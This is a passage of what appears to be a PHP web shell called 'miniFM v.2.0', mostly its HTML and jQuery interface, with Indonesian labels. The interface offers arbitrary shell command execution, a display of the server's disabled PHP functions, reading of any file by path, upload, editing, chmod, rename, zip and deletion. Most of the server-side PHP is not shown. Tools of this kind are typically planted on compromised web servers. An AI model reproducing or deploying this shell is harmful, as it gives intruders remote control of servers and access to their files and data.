						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>
						<span class="d-none d-sm-block">Files</span>
					</button>
					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>
						<span class="d-none d-sm-block">Execute</span>
					</button>
					<button class="nav-link" data-toggle="collapse" data-target="#show-action" type="button" role="button" aria-controls="show-action" aria-expanded="false">
						<svg class="d-block d-sm-none feather feather-zap text-success" fill="var(--bg-icon)" height="1em" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1" viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
						<span class="d-none d-sm-block">Action</span>
					</button>
					<a class="nav-link ml-auto bg-danger text-white" type="button" href="?act=logout">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512" class="d-block d-sm-none"><path fill="#ffffff" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15. 4.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>
						<span class="d-none d-sm-block">Logout</span>
					</a>
				</div>
			</nav>
			<div class="row collapse mt-3 mb-n3" id="show-action">
				<div class="col-sm-12 col-md-6">
					<form method="post" action="?act=changedir" class="mb-3" id="requestchdir">
						<div class="input-group">
							<div class="input-group-prepend">
								<label class="input-group-text">Change dir</label>
							</div>
							<input type="text" name="xpath" class="form-control form-control-sm border-success" value=""></input>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit">Go</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-sm-12 col-md-6">
					<form method="post" action="?act=mkdir" class="mb-3" id="requestmkdir">
						<input type="hidden" name="xpath" value=""/>
						<div class="input-group">
							<div class="input-group-prepend">
								<label class="input-group-text">Create</label>
							</div>
							<select class="custom-select border-success" name="xtype" style="max-width:70px;">
								<option value="dir" selected>dir</option>
								<option value="file">file</option>
							</select>
							<input type="text" name="xdir" class="form-control form-control-sm border-success" max-length="50"></input>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit">Go</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-sm-12 col-md-6">
					<form method="post" action="?act=readfile" class="mb-3" id="requestreadfile">
						<div class="input-group">
							<div class="input-group-prepend">
								<label class="input-group-text">Read files</label>
							</div>
							<input type="text" name="xpath" class="form-control form-control-sm border-success"></input>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit">Go</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-sm-12 col-md-6">
					<form method="post" action="?act=upload" class="mb-3" id="requestupload">
						<input type="hidden" name="xpath" value=""/>
						<div class="input-group">
							<div class="custom-file">
								<input type="file" name="xfile" class="custom-file-input border-success" id="titupl" aria-describedby="upld"></input>
								<label class="custom-file-label" for="titupl">Upload file</label>
							</div>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit" id="upld">Go</button>
							</div>
						</div>
					</form>
				</div>
			</div>
			<div class="tab-content mt-3" id="nav-tabContent">
				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
					<div class="row">
						<div class='col-12 mb-3' id="fileman"></div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-cmd" role="tabpanel">
					<form method="post" action="?act=command" class="mb-3" id="requestcmd">
						<input type="hidden" name="xpath" value=""></input>
						<div class="row">
							<div class="col-12 mb-3">
								<div class="alert bg-success-rgb font-weight-bolder small py-1 px-2">disable_function: <b class="font-weight-lighter"><?php echo is_array(disFunc()) && count(disFunc())>0 ? implode(', ', disFunc()) : "none";?></b></div>
								<code>Command execute</code>
								<div class="input-group mt-2">
									<input type="text" class="form-control form-control-sm border-success" name="cmd" placeholder="uname -a"></input>
									<div class="input-group-append">
										<button class="btn btn-sm btn-outline-success" type="submit">Go</button>
									</div>
								</div>
							</div>
							<div class="col-12 mb-3" id="hasilcommand">
							</div>
						</div>
					</form>
				</div>
			</div>
		</div>
		<div class="modal fade" id="modalshowaksi" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-success">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body"></div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="showchmod" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-success">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">Change permissions</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=chmod" class="mb-3" id="requestchmod">
							<input type="hidden" name="xtype" value=""></input>
							<input type="hidden" name="xname" value=""></input>
							<input type="hidden" name="xpath" value=""></input>
							<div class="form-group row">
								<label for="xname" class="col-sm-2 col-form-label">File</label>
								<div class="col-sm-10">
									<input type="text" class="form-control border-success" id="xname" readonly="readonly" value="" max-length="4"/>
								</div>
							</div>
							<div class="form-group row">
								<label for="xperm" class="col-sm-2 col-form-label">Permission</label>
								<div class="col-sm-10">
									<div class="input-group mb-3">
										<input type="text" class="form-control border-success" id="xperm" name="xperm" value=""/>
										<div class="input-group-append">
											<button class="btn btn-outline-success" type="submit">GO</button>
										</div>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<footer class="footer bg-dark mt-auto py-2">
			<div class="container my-3">
				<blockquote class="blockquote text-center">
					<p class="text-light mb-0">miniFM v.2.0</p>
					<footer class="blockquote-footer">Big surprise for <cite>today!</cite></footer>
				</blockquote>
			</div>
		</footer>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script>
		(function($){
			var loadingIcon = '<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512" style="margin:auto; padding-right:.5em;"><path fill="#444444" d="M304 48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zm0 416a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM48 304a48 48 0 1 0 0-96 48 48 0 1 0 0 96zm464-48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM142.9 437A48 48 0 1 0 75 369.1 48 48 0 1 0 142.9 437zm0-294.2A48 48 0 1 0 75 75a48 48 0 1 0 67.9 67.9zM369.1 437A48 48 0 1 0 437 369.1 48 48 0 1 0 369.1 437z"/></svg>';
			const bs64 = {
				bs64ToBit : function(str) {const binString = atob(str);return Uint8Array.from(binString, (m) => m.codePointAt(0));},
				btTobs64: function(bytes) {const binString = String.fromCodePoint(...bytes);return btoa(binString);},
				isWellFormed: function(str) {
					if (typeof str != "undefined") {
						return str.isWellFormed();
					} else {
						try {encodeURIComponent(str);return true;} catch (error) {return false;}
					}
				},
				encode: function(str) {return bs64.isWellFormed(str) ? bs64.btTobs64(new TextEncoder().encode(str)) : '';},
				decode: function(str) {return bs64.isWellFormed(str) ? new TextDecoder().decode(bs64.bs64ToBit(str)) : '';}
			};
			function callbacks(act, path, name, respon){
				var mb = $('#modalshowaksi').find('.modal-body');
				$.ajax({
					type: 'get',
					url: '?act=path&dir='+path+'&entry='+name+'&opt='+act,
					beforeSend: function(){
						mb.html('<span>'+loadingIcon+' Tunggu bentar...</span>');
					}
				}).done(function(response){
					mb.html('');
					respon(response);
				}).fail(function(response, status, error){
					mb.html('error_code: '+response.status);
				});
			}
			function selactopt(selopt){
				for(var si = 0; si < selopt.length; si++){
					selopt[si].addEventListener('change', function(e){
						var x = $("option:selected", this)[0], act = x.value, om = $('#modalshowaksi'), mbody = '', mtit = '';
						var xtype = x.attributes['data-xtype'], xname = x.attributes['data-xname'], xpath = x.attributes['data-xpath'], cursel = e.currentTarget;
						if(act.length>0){
							switch(act){
								case 'rename':
									mtit = 'Rename '+(xtype.value).toUpperCase();
									mbody = '<form method="post" action="?act=rename" id="requestrename">'+
										'<input type="hidden" name="xtype" value="'+xtype.value+'"/>'+
										'<input type="hidden" name="xpath" value="'+xpath.value+'"/>'+
										'<div class="form-group row">'+
											'<label for="oname" class="col-sm-2 col-form-label">Name</label>'+
											'<div class="col-sm-10"><input type="text" class="form-control border-success" id="oname" name="oname" readonly="readonly" value="'+xname.value+'"/></div>'+
										'</div>'+
										'<div class="form-group row">'+
											'<label for="xname" class="col-sm-2 col-form-label">Rename</label>'+
											'<div class="col-sm-10">'+
												'<div class="input-group mb-3">'+
													'<input type="text" class="form-control border-success" id="xname" name="xname" value="'+xname.value+'"/>'+
													'<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>'+
												'</div>'+
											'</div>'+
										'</div>'+
									'</form>';
								break;
								case 'del':
									mtit = 'Del '+(xtype.value).toUpperCase();
									mbody = '<form method="post" action="?act=del" id="requestdel" class="text-center">'+
										'<input type="hidden" name="xtype" value="'+xtype.value+'"/>'+
										'<input type="hidden" name="xname" value="'+xname.value+'"/>'+
										'<input type="hidden" name="xpath" value="'+xpath.value+'"/>'+
										'<div class="alert alert-danger">Yakin, '+(xtype.value).toUpperCase()+': /'+xname.value+' mw dihapus?!</div>'+
										'<button class="btn btn-success" type="submit">Yakin pak!</button>'+
									'</form>';
								break;
								case 'zip':
									mtit = 'zipArchive '+(xtype.value).toUpperCase();
									mbody = '<form method="post" action="?act=zip" id="requestzip" class="text-center">'+
										'<input type="hidden" name="xtype" value="'+xtype.value+'"/>'+
										'<input type="hidden" name="xname" value="'+xname.value+'"/>'+
										'<input type="hidden" name="xpath" value="'+xpath.value+'"/>'+
										'<div class="alert alert-info">Klik proses utk melanjutkan!!</div>'+
										'<button class="btn btn-success" type="submit">Proses!</button>'+
									'</form>';
								break;
								
							}
							if(act == 'download'){
								window.open('?act=path&dir='+xpath.value+'&entry='+xname.value+'&opt='+act, '_blank');
							} else {
								om.modal('show');
								om.find('.modal-title').html(mtit);
								om.find('.modal-body').html(mbody);
								om.on('hidden.bs.modal', function (ee){
									om.find('.modal-title').html('unknown');
									om.find('.modal-body').html('null');
									cursel.value='';
								});
								if(act == 'edit'){
									om.modal('show');
									om.find('.modal-title').html('Edit '+(xtype.value).toUpperCase()+': /'+xname.value);
									callbacks('view', xpath.value, xname.value, function(e){
										var mbody = '<form method="post" action="?act=path&dir='+xpath.value+'&entry='+xname.value+'&opt=edit" id="requesteditfile">'+
											'<div class="d-block mb-3"><textarea name="xdata" class="form-control" rows="20">'+e+'</textarea></div>'+
											'<center><button class="btn btn-success text-center" type="submit">Simpan</button></center>'+
										'</form>';
										om.find('.modal-body').html(mbody);
									});
									om.on('hidden.bs.modal', function (e){
										om.find('.modal-title').html('unknown');
										om.find('.modal-body').html('null');
										cursel.value='';
									});
								} else if(act == 'view'){
									om.modal('show');
									om.find('.modal-title').html('View '+(xtype.value).toUpperCase()+': /'+xname.value);
									callbacks('view', xpath.value, xname.value, function(e){
										om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+e+'</pre></code>');
									});
									om.on('hidden.bs.modal', function (e){
										om.find('.modal-title').html('unknown');
										om.find('.modal-body').attr('style', '').html('null');
										cursel.value='';
									});
								}
							}
						} else {
							om.modal('show');
							om.find('.modal-title').html('View null');
							callbacks('view', xpath.value, xname.value, function(e){
								om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code>null</code>');
							});
							om.on('hidden.bs.modal', function (e){
								om.find('.modal-title').html('unknown');
								om.find('.modal-body').attr('style', '').html('null');
								cursel.value='';
							});
						}
					}, false);
				}
			}
			function genfileman(path, callback){
				$.ajax({
					type: 'get',
					url: '?act=path&dir='+path,
					timeout: 5000,
					beforeSend: function(){
						$('#fileman').html(loadingIcon+' Tunggu bentar...');
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').hide();
					}
				}).done(function(data, textStatus, jqXHR){
					$('#fileman').html(data);
					$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').show().find('input[name="xpath"]').val(path);
					$('form#requestcmd').find('input[name="xpath"]').val(path);
					$('button#fmanager').attr('data-tempdir', path);
					callback(data);
				}).fail(function(jqXHR, textStatus, errorThrown){
					$('#fileman').html(textStatus+', response code: '+jqXHR.status);
					$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').hide();
					$('form#requestcmd').find('input[name="xpath"]').val(path);
					$('button#fmanager').attr('data-tempdir', path);
				});
			}
			$('button#fmanager').on('click', function(e){
				e.preventDefault();
				var datatempdir = $(e.currentTarget).attr('data-tempdir');
				$.ajax({
					type: 'get',
					url: '?act=path&dir='+datatempdir,
					beforeSend: function(){
						$('body').find('#fileman').html(loadingIcon+' Tunggu bentar...');
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').hide();
					},
					success: function(response){
						$('body').find('#fileman').html(response);
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').show().find('input[name="xpath"]').val(datatempdir);
						$('form#requestcmd').find('input[name="xpath"]').val(datatempdir);
					}
				}).done(function(){
					var selopt = document.querySelectorAll('#showaksi');
					selactopt(selopt);
					$('form#requestcmd').find('input[name="xpath"]').val(datatempdir);
				});
			});
			$('button#fmanager').click();
			if($('#fileman').length>0){
				$('#fileman').on('click', 'a#ffmanager, button#ffmanager', function(e){
					e.stopPropagation();
					var path = $(this), pattr = path.attr('data-path');
					genfileman(pattr, function(){
						var selopt = document.querySelectorAll('#showaksi');
						selactopt(selopt);
					});
				});
				$('#fileman').on('click', 'a#fxmanager', function(e){
					e.stopPropagation();
					var path = $(this), pattr = path.attr('data-path');
					genfileman(pattr, function(){
						var selopt = document.querySelectorAll('#showaksi');
						selactopt(selopt);
					});
				});
			}
			$('#showchmod').on('show.bs.modal', function(e){
				var btn = $(e.relatedTarget), modals = $(this).find('.modal-body');
				var xtype = btn.attr('data-xtype'), xname = btn.attr('data-xname'), xpath = btn.attr('data-xpath'), xperm = btn.attr('data-xperm');
				modals.find('input[name="xtype"]').val(xtype);
				modals.find('input[name="xname"]').val(xname);
				modals.find('input[name="xpath"]').val(xpath);
				modals.find('input[name="xperm"]').val(xperm);
				modals.find('input[id="xname"]').val(xname);
				modals.find('label[for="xname"]').text(xtype.toUpperCase());
			});
			$(document).on('submit', 'form#requestdel', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
			$(document).on('submit', 'form#requestzip', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					}
				}).done(function(response){
					fom.next('span').remove();
					fom.find('button[type="submit"]').prop('disabled',false);
					alert(response);
					$('body').find('#modalshowaksi').modal('hide');
					var axs = $('#fileman').find('a#ffmanager');
					axs[axs.length-1].click(function(e){
						e.stopPropagation();
					});
				});
			});
			$(document).on('submit', 'form#requestrename', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				fom.find('input[readonly="readonly"]').prop('readonly',false);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						fom.find('input[readonly="readonly"]').prop('readonly',true);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
			$(document).on('submit', 'form#requestreadfile', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xpath"]').val(), om = $('#modalshowaksi'), mbody = '', mtit = '';
				fom.find('button[type="submit"]').prop('disabled',true);
				if(chkdir.length<1){
					alert('Isi dulu nama filenya pak!');
				} else {
					om.modal('show');
					om.find('.modal-title').html('View FILE: '+chkdir);
					$.ajax({
						type: 'post',
						url: fom.attr('action'),
						data: fom.serialize(),
						beforeSend: function(){
							$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
						},
						success: function(response){
							fom.next('span').remove();
							fom.find('button[type="submit"]').prop('disabled',false);
							om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+response+'</pre></code>');
						}
					});
				}
			});			
			$(document).on('submit', 'form#requesteditfile', function(e){
				e.preventDefault();
				var fom = $(this), xdata = bs64.encode(fom.find('textarea[name="xdata"]').val());
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: {'xdata': xdata},
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
			$(document).on('submit', 'form#requestchmod', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#showchmod').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
			$(document).on('submit', 'form#requestchdir', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xpath"]').val();
				if(chkdir.length<1){
					alert('Isi dulu nama direktorinya pak!');
				} else {
					fom.find('button[type="submit"]').prop('disabled',true);
					genfileman(chkdir, function(){
						var selopt = document.querySelectorAll('#showaksi');
						if(selopt.length>0){
							selactopt(selopt);
						} else {
							alert('Direktori tidak ada/ tidak berisi file apapun!');
						}
					});
					fom.find('button[type="submit"]').prop('disabled',false);
				}
			});
			$(document).on('submit', 'form#requestnewfile', function(e){
				e.preventDefault();
				var fom = $(this), xdata = bs64.encode(fom.find('textarea[name="xdata"]').val());
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: {'xdata': xdata},
					beforeSend: function(){
						$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
					}
				}).done(function(response){
					fom.next('span').remove();
					fom.find('button[type="submit"]').prop('disabled',false);
					alert(response);
					$('body').find('#modalshowaksi').modal('hide');
					var axs = $('#fileman').find('a#ffmanager');
					axs[axs.length-1].click(function(e){
						e.stopPropagation();
					});
				});				
			});
			$(document).on('submit', 'form#requestmkdir', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xdir"]').val();
				if(chkdir.length<1){
					alert('Isi dulu nama direktorinya pak!');
				} else {
					if(fom.find(':selected').val() == 'file'){
						var om = $('#modalshowaksi'), xpath = fom.find('input[name="xpath"]').val();
						om.modal('show');
						om.find('.modal-title').text('FileName: '+chkdir);
						om.find('.modal-body').html('<form method="post" action="?act=path&dir='+xpath+'&entry='+chkdir+'&opt=newfile" id="requestnewfile">'+
							'<div class="d-block mb-3"><textarea name="xdata" class="form-control" rows="20" placeholder="tulis seperlunya..."></textarea></div>'+
							'<center><button class="btn btn-success text-center" type="submit">Simpan</button></center>'+
						'</form>');
					} else {
						fom.find('button[type="submit"]').prop('disabled',true);
						$.ajax({
							type: 'post',
							url: fom.attr('action'),
							data: fom.serialize(),
							beforeSend: function(){
								$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
							},
							success: function(response){
								fom.next('span').remove();
								fom.find('button[type="submit"]').prop('disabled',false);
								$('<span id="notify" class="mb-3">'+response+'</span>').insertAfter(fom);
								var axs = $('#fileman').find('a#ffmanager');
								axs[axs.length-1].click(function(e){
									e.stopPropagation();
								});
								fom.next('span#notify').fadeTo(3000, 500).slideUp(500, function(){
									$(this).slideUp(500);
								});
							}
						});
					}
				}
			});
			$('input[type="file"]').on('change', function(){
				let files = $(this).prop('files');
				$(this).next('.custom-file-label').html(files[0].name);
			});
			$(document).on('submit', 'form#requestupload', function(e){
				e.preventDefault();
				var fom = $(this);
				var file_data = fom.find('input[name="xfile"]').prop('files');
				var form_data = new FormData(this);
				if(file_data && file_data.size < 1){
					alert('File kosong, gak ada isinya!');
				} else {
					fom.find('button[type="submit"]').prop('disabled',true);
					form_data.append('xfile', file_data);
					$.ajax({
						type: 'post',
						url: fom.attr('action'),
						data: form_data,
						dataType: 'text',
						contentType:false,
						processData:false,
						beforeSend: function(){
							fom.next('span').remove();
							$('<span>'+loadingIcon+' Tunggu bentar...</span>').insertAfter(fom);
						},
						success: function(response){
							fom[0].reset();
							fom.next('span').remove();
							fom.find('button[type="submit"]').prop('disabled',false);
							$('<span id="notify" class="mb-3">'+response+'</span>').insertAfter(fom);
							var axs = $('#fileman').find('a#ffmanager');
							axs[axs.length-1].click(function(e){
								e.stopPropagation();
							});
							fom.next('span#notify').fadeTo(3000, 500).slideUp(500, function(){
								$(this).slideUp(500);
							});
							file_data.val('');
						}
					});	
				}
			});
			$(document).on('submit', 'form#requestcmd', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						fom.find('#hasilcommand').html('<span>'+loadingIcon+' Tunggu bentar...</span>');
					},
					success: function(response){
						var findpath = fom.find('input[name="xpath"]');
						if(findpath.length>0){
							fom.find('input[name="xpath"]')[0].remove();							
						}
						fom.find('button[type="submit"]').prop('disabled',false);
						fom.find('#hasilcommand').html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+response+'</div></div>');
					}
				}).done(function(res){
					var newpath = fom.find('input[name="xpath"]').val();
					$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').find('input[name="xpath"]').val(newpath);
					$.each($('body').find('button[data-tempdir]'), function(i,vv){
						$(vv).attr('data-tempdir', newpath);
					});
					$.each($('body').find('a[data-path]'), function(i,vv){
						$(vv).attr('data-path', newpath);
					});
				});
			});
		})(jQuery);
		</script>
	</body>
</html>
<?php }?>
